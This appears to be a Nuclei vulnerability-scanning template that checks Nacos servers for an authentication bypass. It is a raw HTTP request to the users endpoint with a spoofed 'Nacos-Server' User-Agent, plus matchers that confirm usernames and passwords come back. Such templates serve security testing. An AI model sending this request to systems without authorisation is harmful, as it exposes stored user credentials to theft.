id: nacos-User-Agent-bypass

info:
  name: nacos-User-Agent-unauth
  author: carrypan
  severity: high
  tags: nacos

http:
  - raw:
      - |              
        GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nacos-Server
        Content-Length: 16
        Accept-Encoding: gzip, deflate
        Connection: close
               
    matchers:
      - type: word
        words:
          - "username"
          - "password"
          - "page"
        condition: and
        
